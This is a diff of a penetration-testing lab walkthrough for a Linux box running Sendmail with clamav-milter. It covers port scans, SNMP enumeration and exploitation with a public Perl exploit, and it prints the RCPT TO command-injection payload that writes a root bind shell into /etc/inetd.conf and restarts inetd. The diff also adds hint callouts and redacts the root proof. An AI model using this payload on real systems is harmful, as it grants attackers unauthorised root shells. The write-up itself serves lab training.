@@ -22,7 +22,7 @@ tags: [oscp, box, linux, easy]
 
 **Full port scan first:**
 ```bash
-nmap -p- --min-rate 10000 -oA nmap/clamAV_allports 192.168.128.42
+nmap -p- --min-rate 10000 -oA nmap/clamAV_allports $BoxIP
 ```
 
 Results:
@@ -39,7 +39,7 @@ Results:
 
 **Service scan on those ports:**
 ```bash
-nmap -sC -sV -p 22,25,80,139,199,445,60000 -oA nmap/clamAV_services 192.168.128.42
+nmap -sC -sV -p 22,25,80,139,199,445,60000 -oA nmap/clamAV_services $BoxIP
 ```
 
 Key findings from service scan:
@@ -50,11 +50,14 @@ Key findings from service scan:
 - **Port 60000:** OpenSSH 3.8.1p1, identical hostkeys to port 22, same service running twice, unusual; not the intended path
 - **Hostname via NBstat:** `0XBABE`
 
-**UDP scan — check for SNMP:**
+**UDP scan -- check for SNMP:**
 ```bash
 nmap -sU --top-ports 100 192.168.128.42
 ```
 Result: `161/udp open snmp`. SNMP running, community string still 'public' (default). This is the key.
+
+> [!warning] 💡 Hint
+> A sparse TCP scan does not mean a host is quiet. SNMP is UDP, and its process arguments can reveal startup flags that banners never show. Add a targeted UDP check when TCP enumeration leaves an unexplained service or legacy host.
 
 > 📸 Screenshot: nmap full port scan output (`nmap-allports.png`)
 > 📸 Screenshot: nmap service scan output (`nmap-services.png`)
@@ -98,6 +101,9 @@ Scroll to `[*] Processes:` in the output. The relevant line:
 
 `--black-hole-mode` is the flag that enables the vulnerable behaviour. Without it, the exploit doesn't work. This is why you need SNMP, the version banner alone doesn't tell you the milter is running or what flags it was started with.
 
+> [!abstract] 🧠 Why
+> The exploit depends on a runtime configuration flag, not just a vulnerable version. This is a good example of why process-list enumeration can be more valuable than another version scanner.
+
 SNMP also confirmed other useful info:
 - Hostname: `0xbabe.local`
 - OS: `Linux 0xbabe.local 2.6.8-4-386` (kernel from 2008, Debian Sarge)
@@ -137,12 +143,15 @@ cp $(searchsploit -p 4761 | grep 'Path:' | awk '{print $2}') exploits/
 1. `nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"@localhost`, appends a bind shell to inetd config
 2. `nobody+"|/etc/init.d/inetd restart"@localhost`, restarts inetd so the new config takes effect
 
+> [!tip] ⚡ Efficiency
+> Read the exploit before running it so you know whether it creates a bind or reverse shell, which port it selects, and what service must be restarted. That avoids waiting on a listener that can never receive the chosen connection type.
+
 **Set up a listener, then run the exploit:**
 ```bash
-# Terminal 1 — have nc ready
+# Terminal 1 -- have nc ready
 nc -nv 192.168.128.42 31337
 
-# Terminal 2 — run the exploit
+# Terminal 2 -- run the exploit
 perl exploits/4761.pl 192.168.128.42
 ```
 
@@ -159,11 +168,22 @@ Expected output: `uid=0(root) gid=0(root) groups=0(root)`, no prompt is printed,
 > [!warning] 💡 Hint
 > **Watch out:** This exploit creates a bind shell on the target, not a reverse shell to Kali. Use `nc` in client mode and connect to the target port after `inetd` restarts.
 
+> [!tip] 🛠️ Alternative tools
+> If Netcat behaves differently on the old target, use `telnet`, `socat`, or another TCP client to connect to the bind port. The shell may be silent until a command is typed, so verify it with `id` and `hostname`.
+
 > 📸 Screenshot: exploit output showing both RCPT TO accepted, then nc connecting to port 31337 (`netcat-root.png`)
 
 #### Tags: #SendmailRCE #ClamavMilterExploit #PublicExploit #Perl #EDB4761 #inetdInjection #BindShell
 
 ---
+
+## Decision points and alternate routes
+
+| Observation | Primary route used here | Useful alternative or fallback |
+|---|---|---|
+| UDP SNMP is exposed with a default community | Read process arguments and startup flags | Use targeted OID queries when a full walk is too noisy |
+| Sendmail and clamav-milter match the exploit | Read the public exploit and confirm black-hole mode | Reproduce the SMTP conversation manually if Perl tooling differs |
+| Payload writes an inetd bind shell | Connect to the target port after restart | Use another TCP client if Netcat is unavailable or silent |
 
 ## 4. Root Flag
 
@@ -174,7 +194,7 @@ cat /root/proof.txt
 
 ```
 0xbabe.local
-16e6693d3fc7c6ac736bceae41ef7bcf
+<private root proof>
 ```
 
 > 📸 Screenshot: `id` + `hostname` + `cat /root/proof.txt` in one terminal (OSCP proof format) (`flag.png`)
@@ -189,7 +209,7 @@ cat /root/proof.txt
 - **Version banners in nmap are gold.** Sendmail 8.13.4 in the banner → searchsploit → one match → one shot.
 - **inetd is worth noting when you see it.** If something can write to `/etc/inetd.conf` and restart inetd, it's essentially arbitrary persistent root bind shell.
 - **Old boxes don't have `ip`.** Use `ifconfig` on Debian Sarge era machines.
-- **No privesc needed here** — the exploit chain delivers root shell directly. Exploit the service as root, you get root.
+- **No privesc needed here** -- the exploit chain delivers root shell directly. Exploit the service as root, you get root.
 
 ---
 
